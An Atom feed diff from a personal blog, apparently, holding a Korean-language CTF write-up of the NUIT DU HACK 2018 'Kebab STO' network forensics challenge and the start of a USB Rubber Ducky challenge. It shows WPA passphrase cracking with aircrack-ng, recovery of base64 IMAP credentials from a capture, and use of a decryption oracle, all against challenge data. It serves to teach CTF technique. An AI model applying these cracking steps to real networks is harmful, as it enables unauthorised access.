@@ -1,0 +1,1316 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-19T23:40:18+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Way Back home</title><subtitle>이것 저것 정리</subtitle><author><name>suheyon.Jin</name></author><entry><title type="html">[2018_NUIT_DU_HACK_CTF] Kebab STO(350)</title><link href="http://localhost:4000/ctf/NUIT-DU-HACK-CTF-Kebab-STO-350/" rel="alternate" type="text/html" title="[2018_NUIT_DU_HACK_CTF] Kebab STO(350)" /><published>2018-04-02T00:00:00+09:00</published><updated>2018-04-02T00:00:00+09:00</updated><id>http://localhost:4000/ctf/NUIT-DU-HACK-CTF-Kebab-STO-350</id><content type="html" xml:base="http://localhost:4000/ctf/NUIT-DU-HACK-CTF-Kebab-STO-350/">&lt;h2 id=&quot;exercise&quot;&gt;Exercise&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Description
+The challenge consists in finding the flag into a network capture.
+Challenge is listening on port 8888
+Url : tcp://kebabsto.challs.malice.fr/&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/exercise.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] exercise&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;Network 문제, Pcap 파일(&lt;code class=&quot;highlighter-rouge&quot;&gt;kebabsto.pcapng&lt;/code&gt;)을 확인할 수 있다. HTTP Object 를 먼저 확인했을 때, “kdsqfkpdsdf” 파일을 download 한 것을 확인.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] HTTP Object&lt;/p&gt;
+
+&lt;p&gt;save 하고, ZIP 확장자를 가지며 압축을 풀었을 때 “lkdjflknezcz”라는 tcp packet file를 획득할 수 있었다. file signature 를 통해서, 802.11 packet file임을 알 수 있다.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network
+ file ./kdsqfkpdsdf
+./kdsqfkpdsdf: Zip archive data, at least v2.0 to extract
+ jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network
+ unzip ./kdsqfkpdsdf
+Archive:  ./kdsqfkpdsdf
+  inflating: lkdjflknezcz
+ jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network
+ file ./lkdjflknezcz
+./lkdjflknezcz: tcpdump capture file &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;little-endian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - version 2.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;802.11, capture length 65535&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;하지만, 802.11 packet 내용에 대해서는 아래와 같이 식별할 수 있는 정보들이 존재하지 않았다. WPA 방식의 Encrypt를 사용하고 있었으며, 이를 decrypt할 필요가 보였다.
+&lt;img src=&quot;/assets/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] lkdjflknezcz pcap&lt;/p&gt;
+
+&lt;p&gt;802.11 packet decrypt를 위해서는 wireshark preference의 802.11 항목에 Password:SSID를 넣어주어야 하는데 이를 구하기 위해 &lt;code class=&quot;highlighter-rouge&quot;&gt;aircrack-ng&lt;/code&gt;과 사전파일을 이용해 WPA 방식의 인증을 풀어내었다. password = “abcdefgh” (간단하게 해결될 수 있는 부분이었는데 아래에 TCP 통신을 통해 Decrypt Message와 관련된 부분을 이용해 진행하려다 시간을 많이 허비)
+&lt;img src=&quot;/assets/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] aircrack-ng&lt;/p&gt;
+
+&lt;p&gt;아래와 같이, preference 에서 ssid, pw 정보를 이용해 decrypt 하겠다고 명시해준 후, packet 을 확인해보면, zip 파일의 전송을 확인할 수 있다. raw 로 type 변환 후, 확인한 결과 압축 해제시 Password 를 요구하는 것을 볼 수 있었다. (Password와 관련된 항목을 찾아내야 하는데, 이 부분에서 좀 헤맸던 것 같다.)
+&lt;img src=&quot;/assets/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] 802.11 decrypt&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] 802.11 packet transfer&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] pk password&lt;/p&gt;
+
+&lt;p&gt;결과적으로 첫번째, pcap file (“kebabsto”)에서 관련 항목을 찾아낼 수 있었는데, frame contains 을 통해, “flag”, “zip”, “PK” 등의 packet filtering 을 한 결과 SMTP를 통해 전송된 아래 데이터를 확인할 수 있었고, “docs.zip”라는 파일을 추가적으로 식별할 수 있었다.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;* OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE AUTH=PLAIN AUTH=LOGIN] Dovecot ready.
+1 authenticate PLAIN
++
+AHRvbWF0ZUBkZWJpYW4ueW8AdG9tYXRlMTIz
+1 OK [CAPABILITY IMAP4rev1 LITERAL+ SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS SPECIAL-USE BINARY MOVE] Logged in
+2 ID (&quot;name&quot; &quot;Thunderbird&quot; &quot;version&quot; &quot;52.4.0&quot;)
+* ID (&quot;name&quot; &quot;Dovecot&quot;)
+2 OK ID completed.
+3 select &quot;Sent&quot;
+* FLAGS (\Answered \Flagged \Deleted \Seen \Draft)
+* OK [PERMANENTFLAGS (\Answered \Flagged \Deleted \Seen \Draft \*)] Flags permitted.
+* 17 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 1513610478] UIDs valid
+* OK [UIDNEXT 18] Predicted next UID
+3 OK [READ-WRITE] Select completed (0.001 secs).
+4 UID fetch 1:* (FLAGS)
+* 1 FETCH (UID 1 FLAGS (\Seen))
+* 2 FETCH (UID 2 FLAGS (\Seen))
+* 3 FETCH (UID 3 FLAGS (\Seen))
+* 4 FETCH (UID 4 FLAGS (\Seen))
+* 5 FETCH (UID 5 FLAGS (\Seen))
+* 6 FETCH (UID 6 FLAGS (\Seen))
+* 7 FETCH (UID 7 FLAGS (\Seen))
+* 8 FETCH (UID 8 FLAGS (\Seen))
+* 9 FETCH (UID 9 FLAGS (\Seen))
+* 10 FETCH (UID 10 FLAGS (\Seen))
+* 11 FETCH (UID 11 FLAGS (\Seen))
+* 12 FETCH (UID 12 FLAGS (\Seen))
+* 13 FETCH (UID 13 FLAGS (\Seen))
+* 14 FETCH (UID 14 FLAGS (\Seen))
+* 15 FETCH (UID 15 FLAGS (\Seen))
+* 16 FETCH (UID 16 FLAGS (\Seen))
+* 17 FETCH (UID 17 FLAGS (\Seen))
+4 OK Fetch completed.
+5 UID fetch 17 (UID RFC822.SIZE FLAGS BODY.PEEK[HEADER.FIELDS (From To Cc Bcc Subject Date Message-ID Priority X-Priority References Newsgroups In-Reply-To Content-Type Reply-To)])
+* 17 FETCH (UID 17 RFC822.SIZE 844 FLAGS (\Seen) BODY[HEADER.FIELDS (FROM TO CC BCC SUBJECT DATE MESSAGE-ID PRIORITY X-PRIORITY REFERENCES NEWSGROUPS IN-REPLY-TO CONTENT-TYPE REPLY-TO)] {406}
+Subject: Re: Private
+To: salade &amp;lt;salade@debian.yo&amp;gt;
+References: &amp;lt;6c9268e7-035b-0fa4-0486-c6624af41265@debian.yo&amp;gt;
+ &amp;lt;5f8e93f0-9b6a-522f-f35a-3225bc919df7@debian.yo&amp;gt;
+From: tomate &amp;lt;tomate@debian.yo&amp;gt;
+Message-ID: &amp;lt;9468245b-cfd1-4756-7fe4-0912efceaf9b@debian.yo&amp;gt;
+Date: Thu, 21 Dec 2017 17:09:22 +0100
+In-Reply-To: &amp;lt;5f8e93f0-9b6a-522f-f35a-3225bc919df7@debian.yo&amp;gt;
+Content-Type: text/plain; charset=utf-8
+
+)
+5 OK Fetch completed.
+6 IDLE
++ idling
+* OK Still here
+DONE
+6 OK Idle completed.
+7 noop
+7 OK NOOP completed.
+8 UID fetch 18:* (FLAGS)
+* 17 FETCH (UID 17 FLAGS (\Seen))
+8 OK Fetch completed.
+9 IDLE
++ idling
+DONE
+9 OK Idle completed.
+10 append &quot;Sent&quot; (\Seen) {2227+}
+To: salade &amp;lt;salade@debian.yo&amp;gt;
+From: tomate &amp;lt;tomate@debian.yo&amp;gt;
+Subject: Private
+Message-ID: &amp;lt;3b6a11fe-60fb-f7b3-421e-29b5c0699eb9@debian.yo&amp;gt;
+Date: Thu, 21 Dec 2017 17:12:57 +0100
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+ Thunderbird/52.4.0
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+ boundary=&quot;------------821D8D192BDE01EA2B1C5E07&quot;
+Content-Language: en-US
+
+This is a multi-part message in MIME format.
+--------------821D8D192BDE01EA2B1C5E07
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+They also retrieved a public key and an interesting cipher text
+(attached documents).
+
+Besides, they also found a service at mydomainndh.ndh (port 55555) which
+decrypts every text encrypted with the public key, apart from the
+interesting one.
+
+
+--------------821D8D192BDE01EA2B1C5E07
+Content-Type: application/zip;
+ name=&quot;docs.zip&quot;
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+ filename=&quot;docs.zip&quot;
+
+UEsDBAoAAAAAAFZ6lUsAAAAAAAAAAAAAAAAFABwAZG9jcy9VVAkAA8PCO1rdwjtadXgLAAEE
+AAAAAAQAAAAAUEsDBBQAAAAIALd5lUvQbcUR4wAAABABAAAPABwAZG9jcy9wdWJrZXkucGVt
+VVQJAAOawTtamsE7WnV4CwABBAAAAAAEAAAAAGXPvVaDMABA4Z2n6M7hlAoKjEmIIWDTRsQD
+bBESaKAHqBZant6f1Tve7bOsnyAmlG2OGXyhaJPg4vdZxp4StQc2QelEUvrhhBxDwDMAXMJA
+iOCJJ7DhyI9Zy6iQHS91tfO3c1HK3dO8xEZeTcr/fNflBXHlicfbpSZjdOg7hL8EVolIUG76
+7EwCoO/SC1yXVlHkyb7QrT1Kaqy79PU6d+71efRANYAgdtb6EGdi3T6oocl7YS5qPca3KRig
+NxdAuW+lduwwS9WY0co4iWaxdat13Y5nqbC50BBwAI0/IWbhP/Q3UEsDBBQAAAAIAFZ6lUus
+24QeoQAAADUBAAAPABwAZG9jcy9jaXBoZXJUZXh0VVQJAAPDwjtaw8I7WnV4CwABBAAAAAAE
+AAAAABWPyREAQQgC/xuNFwL5J7bOS6pstWWJTYxoe/3qYopgqq6OQruta0ieSC8nAmvPMGJU
+dmics9wyyrkHpTRV0wVPZoYboT5GDCYmr+GHtrBhLuuGW4llFBXLTFgBbJPOEurBXQ6c0m1c
+xGlI0ZF9wq0L1SeoSkY/n+jtPLcLieaBhiYBAtmsZutOmad7MwzEiXVy4+6Z991gvMPi2ewk
+6/sBUEsBAh4DCgAAAAAAVnqVSwAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAGRvY3Mv
+VVQFAAPDwjtadXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAt3mVS9BtxRHjAAAAEAEAAA8A
+GAAAAAAAAQAAAKSBPwAAAGRvY3MvcHVia2V5LnBlbVVUBQADmsE7WnV4CwABBAAAAAAEAAAA
+AFBLAQIeAxQAAAAIAFZ6lUus24QeoQAAADUBAAAPABgAAAAAAAEAAACkgWsBAABkb2NzL2Np
+cGhlclRleHRVVAUAA8PCO1p1eAsAAQQAAAAABAAAAABQSwUGAAAAAAMAAwD1AAAAVQIAAAAA
+
+--------------821D8D192BDE01EA2B1C5E07--
+
+* 18 EXISTS
+* 1 RECENT
+10 OK [APPENDUID 1513610478 18] Append completed.
+11 noop
+11 OK NOOP completed.
+12 IDLE
++ idling
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;해당 tcp frame 에는 아래와 같이, docs.zip 파일이 base64 encoding 되어 첨부되어 있는 것을 확인할 수 있으며, 이를 decode 한 뒤 동일하게 추출할 수 있었다.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--------------821D8D192BDE01EA2B1C5E07
+Content-Type: application/zip;
+ name=&quot;docs.zip&quot;
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+ filename=&quot;docs.zip&quot;
+
+UEsDBAoAAAAAAFZ6lUsAAAAAAAAAAAAAAAAFABwAZG9jcy9VVAkAA8PCO1rdwjtadXgLAAEE
+AAAAAAQAAAAAUEsDBBQAAAAIALd5lUvQbcUR4wAAABABAAAPABwAZG9jcy9wdWJrZXkucGVt
+VVQJAAOawTtamsE7WnV4CwABBAAAAAAEAAAAAGXPvVaDMABA4Z2n6M7hlAoKjEmIIWDTRsQD
+bBESaKAHqBZant6f1Tve7bOsnyAmlG2OGXyhaJPg4vdZxp4StQc2QelEUvrhhBxDwDMAXMJA
+iOCJJ7DhyI9Zy6iQHS91tfO3c1HK3dO8xEZeTcr/fNflBXHlicfbpSZjdOg7hL8EVolIUG76
+7EwCoO/SC1yXVlHkyb7QrT1Kaqy79PU6d+71efRANYAgdtb6EGdi3T6oocl7YS5qPca3KRig
+NxdAuW+lduwwS9WY0co4iWaxdat13Y5nqbC50BBwAI0/IWbhP/Q3UEsDBBQAAAAIAFZ6lUus
+24QeoQAAADUBAAAPABwAZG9jcy9jaXBoZXJUZXh0VVQJAAPDwjtaw8I7WnV4CwABBAAAAAAE
+AAAAABWPyREAQQgC/xuNFwL5J7bOS6pstWWJTYxoe/3qYopgqq6OQruta0ieSC8nAmvPMGJU
+dmics9wyyrkHpTRV0wVPZoYboT5GDCYmr+GHtrBhLuuGW4llFBXLTFgBbJPOEurBXQ6c0m1c
+xGlI0ZF9wq0L1SeoSkY/n+jtPLcLieaBhiYBAtmsZutOmad7MwzEiXVy4+6Z991gvMPi2ewk
+6/sBUEsBAh4DCgAAAAAAVnqVSwAAAAAAAAAAAAAAAAUAGAAAAAAAAAAQAO1BAAAAAGRvY3Mv
+VVQFAAPDwjtadXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAAAAgAt3mVS9BtxRHjAAAAEAEAAA8A
+GAAAAAAAAQAAAKSBPwAAAGRvY3MvcHVia2V5LnBlbVVUBQADmsE7WnV4CwABBAAAAAAEAAAA
+AFBLAQIeAxQAAAAIAFZ6lUus24QeoQAAADUBAAAPABgAAAAAAAEAAACkgWsBAABkb2NzL2Np
+cGhlclRleHRVVAUAA8PCO1p1eAsAAQQAAAAABAAAAABQSwUGAAAAAAMAAwD1AAAAVQIAAAAA
+
+--------------821D8D192BDE01EA2B1C5E07--
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;docs.zip 파일은 아래와 같이 &lt;code class=&quot;highlighter-rouge&quot;&gt;cipherText&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;private.pem&lt;/code&gt; 2개의 파일을 포함하고 있었는데, cipherText 내용은 아래와 같으며, 결과적으로 문제에서 제시된 서버로, 해당 cipherText를 보낼경우, Decrypt Message를 return하는 것을 확인할 수 있다.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network/docs
+ nc kebabsto.challs.malice.fr 8888
+What message &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to decrypt: ^C
+ ✘ jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Nu_it_du_hack/Network/docs
+ &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; ./cipherText| nc kebabsto.challs.malice.fr 8888
+72873754879996948796542757182427480866384878894019674005699447004829908491467629529161961884224325941110935083467870715412599916138560976722953815670278067115980556377912852138532905866093650699880301357138301236748217037629036311469031537013958415575513723738671978421707050599317605219729945496472798064172
+What message &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to decrypt:
+
+Here is the cleartext of your input :
+
+
+123360975347216093033775350245751721746535757669936
+What message &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;you want to decrypt: %
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;return 된 “123360975347216093033775350245751721746535757669936”를 hex 로 변환 후, 2글자씩 string 으로 decode 하면 아래와 같은 Password 문자열을 얻을 수 있다.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Jul&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2017&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;4.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Compatible&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Apple&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LLVM&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;9.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;900.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;darwin&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;123360975347216093033775350245751721746535757669936&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;123360975347216093033775350245751721746535757669936&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;'54683173317332504073735f57307264254d306630L'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;'Th1s1s2P@ss_W0rd%M0f0'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;위에서 얻은 &lt;code class=&quot;highlighter-rouge&quot;&gt;Th1s1s2P@ss_W0rd%M0f0&lt;/code&gt;를 이용해 이전에 압축 해제시 password 로 인해 풀지 못했던 &lt;code class=&quot;highlighter-rouge&quot;&gt;slkfdsflj&lt;/code&gt; 파일의 압축을 해제하면 아래와 같이 flag를 확인할 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-04-02-NUIT-DU-HACK-CTF-Kebab-STO-350/flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] flag&lt;/p&gt;
+
+&lt;p align=&quot;right&quot;&gt;&lt;strong&gt;ndh2k18{M4k3M4tr10cHKa9r34T4g41n}&lt;/strong&gt;&lt;/p&gt;</content><author><name>suheyon.Jin</name></author><category term="[&quot;CTF&quot;]" /><category term="2018_NDH" /><category term="Network" /><category term="Writeup" /><summary type="html">Exercise</summary></entry><entry><title type="html">[2018_Securinets_CTF] duck_hunt(300)</title><link href="http://localhost:4000/ctf/Securinets-CTF-duck-hunt-300/" rel="alternate" type="text/html" title="[2018_Securinets_CTF] duck_hunt(300)" /><published>2018-03-26T00:00:00+09:00</published><updated>2018-03-26T00:00:00+09:00</updated><id>http://localhost:4000/ctf/Securinets-CTF-duck-hunt-300</id><content type="html" xml:base="http://localhost:4000/ctf/Securinets-CTF-duck-hunt-300/">&lt;h2 id=&quot;exercise&quot;&gt;Exercise&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Do you know someone who loves hunting ducks?
+Link: http://for.ctfsecurinets.com/8/unknown.bin&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-03-26-Securinets-CTF-duck-hunt-300/exercise.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] exercise&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;You can download a binary called “unknown.bin”. After download the “unknown.bin”, that is look like dummy binary.&lt;/p&gt;
+
+&lt;p&gt;you need to know “duck” in exercise. that is “ducky”. ducky, which uses the mcu chip for usb and performs common operations, uses the result of the compilation “inject.bin”.(more important : “https://hakshop.com/products/usb-rubber-ducky-deluxe”)&lt;/p&gt;
+
+&lt;p&gt;below site, you can decode that binary. “https://ducktoolkit.com/decoder/”
+&lt;img src=&quot;/assets/images/2018-03-26-Securinets-CTF-duck-hunt-300/decode.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
